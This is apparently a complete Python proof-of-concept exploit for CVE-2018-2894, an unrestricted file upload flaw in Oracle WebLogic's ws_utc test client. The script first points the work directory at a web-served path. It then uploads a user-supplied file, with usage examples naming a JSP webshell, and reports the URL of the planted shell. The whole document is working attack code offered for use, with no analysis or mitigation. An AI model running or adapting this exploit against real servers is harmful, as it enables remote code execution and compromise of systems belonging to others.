#!/usr/bin/env python3
# CVE-2018-2894 PoC
# by Aquilao

from optparse import OptionParser
import requests
import re


option = OptionParser()
option.add_option("-u", "--url", default=False, help="-u [http(s)://domain/ip:port]")
option.add_option("-f", "--file", default=False, help="-t <webshell_path>")
options, args = option.parse_args()
url = options.url
file = options.file
# url = "http://127.0.0.1:7001"
# file = "/mnt/f/Tools/Web/Cknife/dm.jsp"
info = """
    CVE-2018-2894_PoC.py
    WebLogic Unrestricted File Upload (CVE-2018-2894) PoC
    usage:
        python3 CVE-2018-2894_PoC.py -u <URL> -f <file>
        Acturlly, you can use "-h" :)
    e.g.
        python3 CVE-2018-2894_PoC.py -u http://www.xxx.com:7001 -f /webshell.jsp
        """
if url == False:
    print(info)
    exit()

def Set_Work_Home_Dir():
    Set_Work_Home_Dir_URL = url + "/ws_utc/resources/setting/options"
    Work_Home_Dir = {
        "setting_id" : "general",
        "BasicConfigOptions.workDir" : "/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css",
        "BasicConfigOptions.proxyHost" : "",
        "BasicConfigOptions.proxyPort" :"80"
    }
    print("[+] Try to set Work Home Dir...")
    try:
        response = requests.post(Set_Work_Home_Dir_URL, data = Work_Home_Dir)
        response.raise_for_status()
        match = re.findall("<desc>(.*?)</desc>", response.text)
        print("\033[32m" + "[*] " + str(match[-1]) + "\033[0m")
    except:
        print("\033[31m" + "[!] SET WORK HOME DIR FAILED!" + "\033[0m")

def Upload(file, filename):
    UP_URL = url + "/ws_utc/resources/setting/keystore"
    files = {
        "ks_filename" : [filename, file, "application/octet-stream"]
    }
    print("[+] Try to Upload file...")
    try:
        response = requests.post(UP_URL, files = files)
        response.raise_for_status()
    except:
        print("\033[31m" + "[!] UPLOAD FAILED!" + "\033[0m")
    match = re.findall("<id>(.*?)</id>", response.text)
    shell_url = url + "/ws_utc/css/config/keystore/" + str(match[-1]) + '_' + filename
    print("\033[32m" + "[*] Upload file in " + shell_url + "\033[0m")
    check(shell_url)
    
def check(check_url):
    print("[+] Check " + check_url)
    try:
        response = requests.head(check_url)
        print("\033[32m" + "[*] Status code: " + str(response.status_code) + "\033[0m")
        response.raise_for_status()
    except:
        print("\033[31m" + "[!] HTTP ERROR!" + "\033[0m")
        exit()

def main():
    config_url = url + "/ws_utc/config.do"
    check(config_url)
    filename = file.split('/')[-1]
    try:
        files = open(file, "rb")
    except:
        print("\033[31m" + "[!] READ FILE FAILED!" + "\033[0m")
        exit()
    Set_Work_Home_Dir()
    Upload(files, filename)

if __name__ == "__main__":
    main()